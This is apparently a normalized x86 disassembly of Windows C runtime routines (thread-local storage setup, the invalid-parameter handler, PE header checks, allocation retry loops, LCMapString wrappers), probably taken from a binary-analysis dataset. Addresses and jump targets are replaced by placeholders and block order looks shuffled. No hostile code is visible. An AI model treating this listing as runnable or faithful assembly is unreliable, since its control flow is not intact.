mov edi eax
call sub_10013238
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_10013c93
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_1001319d
pop ecx
call eax
test eax eax
je r-xdata
push esi
call sub_1000fe7d
pop ecx
xor esi esi
push 0x0
push esi
call sub_100132c6
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_10013440
push 0x8
push r--data
call sub_10012000
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_10012045
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_1000fe7d
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_1000fe7d
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_1000fe7d
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_1000fe7d
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_1000fe7d
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_1000fe7d
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_1000fe7d
pop ecx
push 0xd
call sub_10011508
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_1000fe7d
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001355a
push 0xc
call sub_10011508
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10013566
push esi
call sub_1000fe7d
pop ecx
push edi
call sub_10012fd5
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_1000fe7d
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_10012dfd
pop ecx
sub_1001356f
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push 0x0
push eax
call [ TlsSetValue@IAT ]
push 0x0
push [ rw-data ]
push [ rw-data ]
call sub_1001319d
pop ecx
call eax
push [ ebp + 0x8 ]
call sub_10013440
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ rw-data ]
push [ rw-data ]
call esi
call eax
mov [ ebp + 0x8 ] eax
sub_100135dd
mov edi edi
push esi
push edi
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov edi eax
test edi edi
je r-xdata
push esi
call sub_100121ec
pop ecx
call sub_10013289
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_1001320f
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_100124b1
push [ rw-data ]
call sub_10013122
push [ rw-data ]
mov [ rw-data ] eax
call sub_10013122
push [ rw-data ]
mov [ rw-data ] eax
call sub_10013122
push [ rw-data ]
mov [ rw-data ] eax
call sub_10013122
add esp 0x10
mov [ rw-data ] eax
call sub_1001138c
test eax eax
je r-xdata
test eax eax
jne r-xdata
push sub_10013440
push [ rw-data ]
call sub_1001319d
pop ecx
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_10013c93
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_1001319d
pop ecx
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_100132c6
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
retn
sub_1001376a
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
mov ecx eax
sub esp 0x14
cmp [ ebp + 0x8 ] cx
je r-xdata
leave
retn
push ebx
push [ ebp + 0xc ]
lea ecx [ ebp - 0x14 ]
call sub_10010024
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x14 ]
xor ebx ebx
cmp edx ebx
jne r-xdata
push esi
mov eax 0x100
mov esi eax
cmp [ ebp + 0x8 ] si
pop esi
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp cx 0x19
ja r-xdata
push [ ecx + 0x4 ]
lea ecx [ ebp - 0x4 ]
push 0x1
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
push edx
lea eax [ ebp - 0x14 ]
push eax
call sub_100172b0
add esp 0x20
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_10017307
add esp 0xc
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
movzx eax ax
jmp r-xdata
add eax 0x20
cmp [ ebp - 0x8 ] bl
je r-xdata
movzx eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x14 ]
mov ecx [ ecx + 0xcc ]
movzx ax [ ecx + eax ]
jmp r-xdata
pop ebx
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1001382e
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x328 ] 0x0
push ebx
push 0x4c
lea eax [ ebp - 0x324 ]
push 0x0
push eax
call sub_10010a00
lea eax [ ebp - 0x328 ]
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x2d4 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x20c ] ecx
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x328 ] 0xc0000417
mov [ ebp - 0x324 ] 0x1
mov [ ebp - 0x31c ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov ebx eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push 0xc0000417
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_1000fe6e
leave
retn
test ebx ebx
jne r-xdata
push 0x2
call sub_1001620b
pop ecx
sub_10013956
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_1001319d
pop ecx
test eax eax
je r-xdata
push 0x2
call sub_1001620b
pop ecx
pop ebp
jmp sub_1001382e
pop ebp
jmp eax
sub_10013980
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_100139c0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
jbe r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10013a10
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_10012060
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_10013980
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_100139c0
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10013ace
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_100133ad
mov esi eax
test esi esi
je r-xdata
pop esi
leave
retn
mov edx [ esi + 0x5c ]
mov eax [ rw-data ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx edx
push ebx
imul eax eax 0xc
add eax edx
cmp ecx eax
jae r-xdata
mov ebx eax
imul ebx ebx 0xc
add ecx 0xc
add ebx edx
cmp ecx ebx
jb r-xdata
xor eax eax
cmp [ ecx ] edi
jne r-xdata
cmp [ ecx ] edi
je r-xdata
xor eax eax
jmp r-xdata
mov ebx [ eax + 0x8 ]
mov [ ebp - 0x4 ] ebx
test ebx ebx
jne r-xdata
mov eax ecx
jmp r-xdata
pop ebx
pop edi
cmp ebx 0x5
jne r-xdata
test eax eax
je r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ esi + 0x60 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call ebx
mov ecx [ rw-data ]
mov edi [ rw-data ]
mov edx ecx
add edi ecx
cmp edx edi
jge r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
imul ecx ecx 0xc
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
add ecx 0xc
cmp edx ebx
jl r-xdata
mov ebx [ ebp - 0x4 ]
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
mov [ esi + 0x60 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
mov [ esi + 0x64 ] 0x8a
sub_10013c2e
mov edi edi
push ebp
mov ebp esp
mov eax 0xe06d7363
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0xc ]
push eax
call sub_10013ace
pop ecx
pop ecx
pop ebp
retn
sub_10013c4e
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_1000ff5a
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_10013c93
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10017391
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_10013cdf
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100174af
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_10013d2d
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100176ca
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_10013d7f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_1000fe7d
pop ecx
sub_10013d9f
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
xor ebx ebx
push edi
mov esi ecx
cmp [ rw-data ] ebx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jle r-xdata
push ebx
push ebx
xor edi edi
inc edi
push edi
push r--data
push 0x100
push ebx
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
sub eax ecx
dec eax
cmp eax [ ebp + 0x14 ]
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
cmp eax 0x1
jne r-xdata
mov [ ebp + 0x14 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
push [ ebp + 0x8 ]
call sub_10017745
pop ecx
mov [ ebp - 0x14 ] eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
xor eax eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
cmp eax [ ebp + 0x20 ]
je r-xdata
lea esp [ ebp - 0x20 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000fe6e
leave
retn
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x24 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x20 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
mov esi eax
push ebx
push ebx
lea ecx [ ebp + 0x14 ]
push ecx
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x20 ]
call sub_1001778e
add esp 0x18
mov [ ebp - 0xc ] eax
cmp eax ebx
je r-xdata
jle r-xdata
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
push [ ebp - 0xc ]
call sub_1000fe7d
pop ecx
mov esi [ LCMapStringA@IAT ]
push ebx
push ebx
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
mov eax esi
cmp [ ebp + 0x18 ] eax
je r-xdata
jle r-xdata
xor esi esi
jmp r-xdata
push edi
push [ ebp - 0xc ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push eax
call sub_1000fe7d
pop ecx
xor edi edi
cmp eax 0xffffffe0
ja r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
push [ ebp - 0xc ]
call sub_10013d7f
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov ecx eax
mov [ ebp - 0x8 ] ecx
cmp ecx ebx
je r-xdata
push eax
call sub_1000ff5a
pop ecx
cmp eax ebx
je r-xdata
call sub_10017950
mov eax esp
cmp eax ebx
je r-xdata
push [ ebp - 0x8 ]
push ebx
push edi
call sub_10010a00
add esp 0xc
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
add eax 0x8
cmp eax 0x400
ja r-xdata
test [ ebp + 0xc ] 0x400
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push [ ebp + 0x18 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp - 0x14 ]
call sub_1001778e
mov esi eax
mov [ ebp - 0x10 ] esi
add esp 0x18
neg esi
sbb esi esi
and esi [ ebp - 0x8 ]
xor esi esi
jmp r-xdata
push eax
call sub_1000ff5a
pop ecx
cmp eax ebx
je r-xdata
call sub_10017950
mov edi esp
cmp edi ebx
je r-xdata
cmp ecx ebx
jle r-xdata
cmp [ ebp + 0x1c ] ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
push edi
call sub_10013d7f
pop ecx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
cmp ecx [ ebp + 0x1c ]
jg r-xdata
cmp edi ebx
je r-xdata
push [ ebp - 0x8 ]
push esi
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
jmp r-xdata
push esi
call sub_10013d7f
pop ecx
push ebx
push ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
push eax
call sub_1000ff5a
pop ecx
cmp eax ebx
je r-xdata
call sub_10017950
mov esi esp
cmp esi ebx
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push ebx
jmp r-xdata
mov esi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ esi ] 0xcccc
add esi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push esi
push ebx
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp esi ebx
je r-xdata
sub_10014144
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10010024
push [ ebp + 0x28 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10013d9f
add esp 0x20
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10014189
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10010024
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_100141d4
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_10010024
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_10014189
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_10016ee5
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_1001428c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0xc ]
push ebx
xor ebx ebx
push esi
xor esi esi
mov [ ebp - 0x4 ] ebx
cmp eax ebx
jne r-xdata
cmp [ eax ] bl
je r-xdata
call sub_1001129f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10013956
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push edi
mov edi [ ebp + 0x10 ]
cmp edi ebx
je r-xdata
pop esi
pop ebx
leave
retn
call sub_1001129f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10013956
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
pop edi
cmp [ eax ] bl
jne r-xdata
call sub_1001129f
mov eax [ eax ]
mov [ ebp - 0x10 ] eax
call sub_1001129f
push [ ebp + 0x14 ]
mov [ eax ] ebx
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001457e
add esp 0x10
mov [ ebp - 0xc ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_1001129f
cmp [ eax ] ebx
jne r-xdata
call sub_1001129f
cmp [ eax ] 0x2
jne r-xdata
cmp esi ebx
je r-xdata
call sub_1001129f
mov ecx [ ebp - 0x10 ]
mov [ eax ] ecx
push 0x2f
push [ ebp + 0xc ]
call sub_10017ba0
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] ebx
je r-xdata
push esi
call sub_1000fe7d
pop ecx
push r--data
lea eax [ ebp - 0x4 ]
push ebx
push eax
call sub_100148af
add esp 0xc
cmp eax ebx
je r-xdata
mov eax [ ebp - 0xc ]
push [ ebp - 0x4 ]
call sub_1000fe7d
pop ecx
cmp [ ebp - 0x4 ] ebx
je r-xdata
cmp eax 0x16
jne r-xdata
push 0x1
push 0x104
call sub_10013c93
mov esi eax
pop ecx
pop ecx
cmp esi ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1001382e
add esp 0x14
jmp r-xdata
push 0x103
push esi
push [ ebp - 0x4 ]
jmp r-xdata
call sub_1001797c
add esp 0xc
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
cmp [ esi ] bl
je r-xdata
push esi
call sub_10016180
lea edi [ eax + esi - 0x1 ]
mov al [ edi ]
pop ecx
cmp al 0x5c
jne r-xdata
cmp al 0x2f
je r-xdata
push 0x5c
push esi
call sub_10017acd
pop ecx
pop ecx
cmp edi eax
je r-xdata
push esi
call sub_10016180
push [ ebp + 0xc ]
mov edi eax
call sub_10016180
add edi eax
mov eax 0x104
pop ecx
pop ecx
cmp edi eax
jae r-xdata
push r--data
push 0x104
push esi
call sub_10016b4f
add esp 0xc
test eax eax
je r-xdata
push r--data
push 0x104
push esi
call sub_10016b4f
add esp 0xc
jmp r-xdata
push [ ebp + 0xc ]
push eax
push esi
call sub_10016b4f
add esp 0xc
test eax eax
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1001382e
add esp 0x14
call sub_1001129f
push [ ebp + 0x14 ]
mov [ eax ] ebx
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
call sub_1001457e
add esp 0x10
mov [ ebp - 0xc ] eax
cmp eax 0xffffffff
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1001382e
add esp 0x14
call sub_1001129f
cmp [ eax ] 0x2
je r-xdata
push 0x103
push esi
push [ ebp - 0x8 ]
push 0x5c
push esi
call sub_10017ba0
pop ecx
pop ecx
cmp esi eax
je r-xdata
lea edi [ esi + 0x1 ]
push 0x5c
push edi
call sub_10017ba0
pop ecx
pop ecx
cmp edi eax
je r-xdata
push 0x2f
push esi
call sub_10017ba0
pop ecx
pop ecx
cmp esi eax
jne r-xdata
push 0x2f
push edi
call sub_10017ba0
pop ecx
pop ecx
cmp edi eax
jne r-xdata
sub_10014504
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
xor esi esi
cmp [ ebp + 0xc ] esi
jne r-xdata
cmp [ ebp + 0x10 ] esi
je r-xdata
call sub_1001129f
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10013956
